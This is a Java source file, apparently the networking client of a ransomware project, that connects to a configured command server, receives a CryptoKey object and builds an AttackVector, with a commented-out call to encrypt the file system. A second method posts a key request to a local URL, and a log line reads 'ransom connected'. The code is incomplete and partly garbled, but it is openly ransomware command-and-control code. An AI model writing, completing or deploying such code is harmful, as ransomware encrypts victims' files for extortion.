package Agent.networking;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;

import org.springframework.beans.factory.annotation.Value;

import Agent.Attack.AttackVector;
import Agent.entites.CryptoKey;

public class Client {
	@Value("${server.port}")
	private int port;
	@Value("${server.host}")
	private String host;

	//commit
	public void start() throws Exception {
		try {
			while (true) {
				Socket clientSocket = new Socket(host, port);
				ObjectInputStream is = new ObjectInputStream(clientSocket.getInputStream());
				System.out.println("ransom connected + got input stream");
				CryptoKey key = (CryptoKey) is.readObject();
				AttackVector attack = new AttackVector();
				//.attacattack.encryptFileSystem(key);
				clientSocket.close();
			}
		} catch (ClassNotFoundException | IOException e) {
			throw new Exception();
		}
	}

	public void getCrypto() {
		 try {
		        String toSend = "CryptoKey";
		        String urlParameters = "message=" + toSend;
		        String request = "http://127.0.0.1:8080/Project/message.html";
		        URL url = new URL(request);

		        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
		        connection.setDoOutput(true);
		        connection.setDoInput(true);
		        connection.setInstanceFollowRedirects(false);
		        connection.setRequestMethod("POST");
		        connection.setRequestProperty("Content-Type","");
		        connection.setRequestProperty("charset", "utf-8");
		        connection.setRequestProperty("Content-Length","" + Integer.toString(urlParameters.getBytes().length));
		        connection.setUseCaches(false);

		        DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
		        wr.writeBytes(urlParameters);

		        int code = connection.getResponseCode();
		        System.out.println(code);
		        wr.flush();
		        wr.close();
		        connection.disconnect();
		    } catch (Exception e) {
		        e.printStackTrace();
		    }
	}
}
